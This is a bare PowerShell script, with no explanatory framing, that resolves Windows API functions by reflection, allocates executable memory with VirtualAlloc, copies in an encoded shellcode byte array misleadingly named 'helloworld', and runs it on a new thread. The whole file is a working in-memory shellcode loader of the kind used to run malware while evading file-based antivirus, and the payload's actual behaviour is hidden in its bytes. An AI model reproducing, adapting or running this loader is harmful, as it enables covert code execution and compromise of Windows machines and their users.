function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
    @($moduleName)), $functionName))
}

function getDelegateType {
    Param (
    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
    [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
    [System.MulticastDelegate])
    $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
    [System.Reflection.CallingConventions]::Standard, $func).
    SetImplementationFlags('Runtime, Managed')
    $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

# Allocate executable memory
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), 
  (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $helloworld = 0x49,0xb9,0xaa,0x8c,0x54,0xb8,0x49,0x59,0xad,0xe,0x54,0xda,0xc2,0x48,0x31,0xf6,0x41,0x5f,0x40,0xb6,0x82,0x66,0x41,0x81,0xe7,0xb0,0xf6,0x49,0xf,0xae,0x7,0x49,0x8b,0x5f,0x8,0x48,0xff,0xce,0x4c,0x31,0x4c,0xf3,0x25,0x48,0x85,0xf6,0x75,0xf3,0xfe,0xd6,0x1d,0x0,0xc4,0x6c,0x4b,0x71,0xdd,0x5d,0x92,0xd4,0x93,0x98,0xcb,0x8f,0x48,0xbc,0xa7,0xf5,0x78,0xbd,0xe5,0x1,0x4,0x8e,0x15,0xc,0x32,0x11,0x2e,0xcc,0xa2,0xc4,0xdf,0x82,0x0,0xa6,0x61,0x40,0x9b,0xc8,0xb3,0x9d,0x4,0xdc,0x49,0x7b,0x59,0x49,0xdb,0x78,0xb6,0x9f,0x16,0x60,0xeb,0x82,0x7c,0x16,0xbf,0xc9,0x1a,0x49,0x21,0xb1,0x96,0x16,0x7,0xee,0xa6,0x12,0x8e,0xe,0xcf,0x59,0x86,0x5b,0x34,0x43,0xa9,0x9,0x29,0xa1,0xfe,0x66,0x4d,0x9c,0x3,0x18,0x29,0xdb,0xf6,0x5b,0x8f,0xa7,0xcf,0x52,0xd1,0x23,0x53,0x17,0xfe,0x36,0x8e,0xa2,0x56,0xf3,0xd7,0xc8,0x7,0xaf,0xc7,0x52,0xfb,0xc,0x53,0x9c,0xba,0x5d,0x28,0xf9,0x4,0x58,0x19,0xe4,0xe2,0x2c,0x4e,0xf9,0x80,0xf4,0x53,0x52,0xaa,0xa6,0x77,0xe4,0xd3,0xd9,0x53,0x28,0xba,0x9b,0xb5,0x67,0xe2,0xe5,0x40,0x79,0x87,0xf9,0xfa,0x9c,0xb4,0x58,0x48,0x71,0x87,0xd2,0xda,0x66,0xdc,0x90,0xa,0xb8,0xd9,0x11,0xe0,0xcf,0xc3,0x3c,0x7a,0x3f,0x95,0x6b,0xa0,0xec,0xdb,0x77,0x82,0xe3,0x2c,0xdd,0xe8,0x67,0xe2,0x52,0xd3,0xdc,0x2c,0xa7,0xf8,0x5a,0x20,0x59,0x10,0xcb,0x35,0x79,0x18,0xd1,0xdd,0x6b,0x8b,0x91,0x95,0xf0,0xa2,0xa0,0x95,0x6d,0x83,0x1f,0xda,0x21,0x19,0x5d,0x2b,0x8d,0x7b,0xd8,0xf6,0xe8,0xaa,0xf0,0x6b,0x8e,0xb,0x18,0x3d,0xab,0x41,0xa8,0xdd,0xc2,0x86,0x21,0x18,0xda,0x62,0xa8,0xa7,0xf2,0xbf,0xe3,0x81,0xe8,0x62,0xcc,0x50,0x2d,0xfc,0x0,0x7d,0xa0,0xa0,0x79,0xe1,0x95,0x62,0x51,0x35,0x91,0x33,0x7e,0xc5,0x8d,0xbb,0x52,0x1d,0xe8,0x6a,0x7a,0xb8,0x8d,0xbb,0x52,0x5d,0xe8,0xee,0x9f,0xea,0x8f,0x78,0x8b,0xf,0xf0,0xac,0x19,0x69,0x8d,0x1,0xc0,0xd1,0x9c,0x80,0x54,0xa2,0xe9,0x10,0x41,0xbc,0x69,0xec,0x69,0xa1,0x4,0xd2,0xed,0x2f,0xe1,0xb0,0x60,0x2b,0x97,0x10,0x8b,0x3f,0x9c,0xa9,0x29,0x70,0xa3,0xb1,0x78,0x65,0xab,0xe3,0x27,0x25,0xb7,0x30,0x0,0x7d,0x2b,0x61,0xa0,0xa0,0xc5,0x30,0x48,0xf8,0x60,0x95,0x4f,0xe8,0xc4,0xe0,0x50,0xf6,0xe8,0xf9,0x6c,0x2b,0x85,0x10,0x49,0x7c,0x70,0x2,0x7e,0xed,0xf4,0xf9,0x48,0x82,0x69,0xa0,0xa3,0x94,0x4d,0x78,0x1,0xab,0xe8,0xd0,0xe8,0xe1,0x4,0xf9,0xd,0xd1,0xe1,0xe0,0xe9,0x98,0x25,0x45,0xf1,0x31,0xa3,0xad,0xc,0xa8,0x80,0x9,0xd1,0x8,0x78,0xb9,0x6c,0x2b,0x85,0x14,0x49,0x7c,0x70,0x87,0x69,0x2b,0xc9,0x78,0x44,0xf6,0xe0,0xfd,0x61,0xa1,0x15,0x71,0x8b,0x79,0x28,0xa9,0x29,0x70,0x84,0x68,0x41,0x25,0xfe,0xb8,0x72,0xe1,0x9d,0x71,0x59,0x3c,0xfa,0xa9,0xab,0x4c,0xe5,0x71,0x52,0x82,0x40,0xb9,0x69,0xf9,0x9f,0x78,0x8b,0x6f,0x49,0xaa,0xd7,0x5f,0x3a,0x6d,0x48,0x4c,0x7b,0xb2,0x61,0x1e,0xb2,0x59,0x6e,0x14,0xce,0x84,0x5c,0xa0,0x84,0x66,0x48,0xf4,0x41,0xa8,0xef,0x62,0x89,0x47,0x26,0x7a,0x5f,0x34,0x7b,0xf3,0x8d,0xb9,0xe1,0x2e,0xfa,0xac,0x19,0x60,0x88,0x1,0xc9,0x2e,0xf3,0xa8,0x92,0x9a,0x93,0x49,0xa7,0x7d,0xa0,0xe1,0x28,0x5f,0x10,0xd8,0xe,0x7d,0xa0,0xe1,0x1f,0x99,0xeb,0x1,0x31,0x4a,0x8e,0xd3,0x1c,0x8e,0xf4,0x7,0x37,0x7d,0xfa,0xa9,0xa1,0x61,0x8c,0xf7,0xc0,0xc6,0xa1,0xe1,0x28,0xed,0xf4,0xf9,0x53,0x2e,0xca,0xe2,0x7b,0xe9,0x7f,0x67,0x89,0xe2,0x66,0xe1,0x28,0xa0,0xc5,0xcf,0xd5,0x95,0x72,0xe1,0x28,0xa0,0xea,0x46,0x6d,0x3e,0xea,0x97,0x5a,0xc2,0xa7,0x59,0x4f,0x1a,0xd1,0xa4,0x7b,0xd3,0x91,0x64,0x50,0x8,0xe3,0x8e,0x5f,0xd1,0xab,0x64,0x4e,0x4f,0xe7,0x90,0x11,0x95,0x95,0x72,0x70,0x11,0xce,0xab,0x5,0xf7,0x93,0x3,0x57,0x29,0xc3,0x87,0x11,0xf9,0xf7,0x8,0x57,0x4d,0x95,0xb4,0x70,0xe5,0xbd,0x45,0x70,0x10,0xce,0xd7,0x43,0xea,0xaa,0x72,0x77,0x45,0x93,0x87,0x4b,0xc1,0xb7,0x42,0x56,0x45,0xd1,0xd9,0x78,0xc4,0xf7,0x8,0x41,0xe,0xeb,0xb3,0x4c,0xd2,0xbf,0x1,0x6d,0x5,0xda,0x91,0x11,0xe8,0x92,0x7f,0x33,0x29,0xc8,0xd1,0x5d,0xf6,0xa7,0x52,0x78,0x4c,0xe9,0xb9,0x62,0xf7,0xa9,0x44,0x34,0x2e,0x96,0x90,0x4f,0xe2,0xa8,0x76,0x39,0x27,0xe2,0xd6,0x1e,0x97,0xb3,0x60,0x6f,0x19,0xd1,0x9b,0x78,0xc1,0xb2,0x65,0x4a,0xa,0xd7,0x87,0x5d,0xf7,0xfd,0x69,0x65,0xd,0x94,0x8f,0x6b,0xce,0x9a,0x1d,0x51,0x1a,0x96,0x82,0x6e,0xc7,0xa7,0x68,0x41,0x27,0xc8,0x84,0x40,0xcb,0xf0,0x48,0x44,0x22,0xcc,0x95,0x47,0xc8,0xe8,0x45,0x68,0x2d,0xe4,0x86,0x6b,0xef,0xfc,0x75,0x39,0xf,0xc9,0xa4,0x4e,0xcf,0xa7,0x59,0x74,0x2c,0xe5,0xab,0x5d,0xd5,0xad,0x69,0x74,0x12,0xf3,0x92,0x4e,0xeb,0xb2,0x30,0x48,0xf4,0x61,0xb2,0x72,0xe1,0x9d,0x7d,0x31,0xb4,0xf3,0xa9,0x90,0xa0,0xf7,0x98,0x84,0x7d,0xa0,0xe1,0x28,0xf0,0x96,0x63,0x49,0xba,0x62,0xa,0x7d,0x8e,0xfe,0xcf,0xd5,0x35,0x29,0x27,0x42,0xaa,0x9a,0x78,0x89,0x8c,0xca,0xfe,0x72,0xf2,0xad,0xb0,0x33,0x7d,0xa0,0xa8,0xa1,0x40,0xaf,0x34,0x41,0x24,0xe9,0x5b,0x5d,0xe6,0x5b,0xb6,0x0,0x7d,0xa0,0xe1,0xd7,0x75,0x88,0x1,0xc0,0x2e,0xfa,0xa9,0xa1,0x51,0x88,0x1,0xc9,0x30,0x91,0x28,0x7b,0xf3,0x8c,0xf7,0xc2,0x50,0xa6,0xf9,0x53,0x5f,0x10,0xb5,0xc0,0x8,0xbf,0xa9,0xef,0x61,0x4d,0x23,0x0,0x7d,0xe9,0x5b,0x6c,0x50,0xf0,0xd0,0x0,0x7d,0xa0,0xe1,0xd7,0x75,0x8d,0xcf,0xcf,0x9,0xa2,0xa,0x82,0x48,0x90,0x30,0x0,0x7d,0xf3,0xb8,0x42,0xe0,0x9f,0x79,0x89,0xac,0x61,0x3,0x38,0xe9,0x2,0xf0,0x0,0x6d,0xa0,0xe1,0x61,0x1a,0x9d,0x94,0x53,0x98,0xa0,0xe1,0x28,0xa0,0x3a,0xe5,0x48,0xee,0xf3,0xb2,0x60,0x29,0x22,0x78,0x89,0x8c,0xe8,0x68,0xf2,0xe9,0x2,0xf0,0x0,0x5d,0xa0,0xe1,0x61,0x29,0x3c,0x79,0xba,0x6f,0x36,0x68,0xca,0xa0,0xc5,0x30,0x0,0x82,0x75,0xa9,0xab,0x64,0xe5,0xb5,0xc0,0x9,0x12,0x87,0xa3,0xa7,0x8d,0x31,0xc3,0xf8,0x60,0x94,0xfa,0xf8,0x6,0x68,0x6a,0x7d,0xf9,0x5a,0xc8,0xbd,0xef,0x3a,0x41,0xf4,0x7a,0x1e,0xfd,0xe8,0x5d,0xa0,0x46,0x3c,0xa0,0xa8,0xfc,0x65,0xa,0xb0,0xb1,0xd6,0x1e,0xb4,0x2,0x93,0x40,0x5a,0x91,0x26,0xff,0x10,0xb3,0x14,0x9d,0xb4,0xec,0x32,0x4f


[System.Runtime.InteropServices.Marshal]::Copy($helloworld, 0, $lpMem, $helloworld.length)

# Execute shellcode and wait for it to exit
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread),
  (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject),
  (getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)